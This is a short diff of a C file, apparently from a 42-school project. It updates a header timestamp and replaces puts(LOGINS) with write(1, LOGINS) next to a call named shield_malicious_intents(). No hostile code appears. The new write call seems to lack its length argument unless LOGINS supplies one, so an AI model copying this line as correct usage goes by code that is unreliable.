@@ -6,7 +6,7 @@
 /*   By: kiroussa <oss@xtrm.me>                     +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2025/03/23 01:58:58 by kiroussa          #+#    #+#             */
-/*   Updated: 2025/05/10 21:53:37 by kiroussa         ###   ########.fr       */
+/*   Updated: 2025/05/10 22:08:43 by kiroussa         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -64,6 +64,6 @@ int	main(void)
 		shield_malicious_intents();
 		DEBUG("malicious intents done\n");
 	}
-	puts(LOGINS);
+	write(1, LOGINS);
 	return (0);
 }
